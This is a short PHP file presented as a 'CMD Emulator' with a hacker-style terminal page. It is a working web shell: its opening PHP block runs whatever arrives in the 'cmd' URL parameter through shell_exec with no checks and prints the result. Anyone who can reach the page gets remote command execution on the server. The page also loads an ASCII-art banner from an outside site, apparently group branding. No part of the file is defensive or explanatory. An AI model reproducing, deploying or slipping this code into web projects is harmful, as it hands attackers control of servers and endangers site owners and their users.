<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CMD Emulator</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            color: green;
            font-family: monospace;
        }
        .cmd-container {
            width: 100vw;
            height: 100vh;
            padding: 10px;
            box-sizing: border-box;
            overflow-y: auto;
        }
        .cmd-output {
            white-space: pre-wrap;
        }
        .cmd-input {
            outline: none;
            border: none;
            background: transparent;
            color: green;
            width: 100%;
            box-sizing: border-box;
        }
        .cmd-prompt {
            color: green;
        }
        .cmd-art img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="cmd-container" id="cmd-container">
        <div id="cmd-output" class="cmd-output">
            <div class="cmd-art">
                <img src="https://www.nansquad.top/nanwbshascii.png" alt="ASCII Art">
            </div>
        </div>
        <form method="get">
            <input id="cmd-input" class="cmd-input" name="cmd" autofocus />
        </form>
    </div>

    <script>
        const cmdOutput = document.getElementById('cmd-output');
        const cmdInput = document.getElementById('cmd-input');
        const cmdContainer = document.getElementById('cmd-container');

        cmdInput.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                cmdOutput.innerHTML += `<div class="cmd-prompt"># ${cmdInput.value}</div>`;
                cmdContainer.scrollTop = cmdContainer.scrollHeight;  // Scroll to the bottom
            }
        });

        cmdInput.addEventListener('focus', function() {
            this.value = '';
        });
    </script>
</body>
</html>
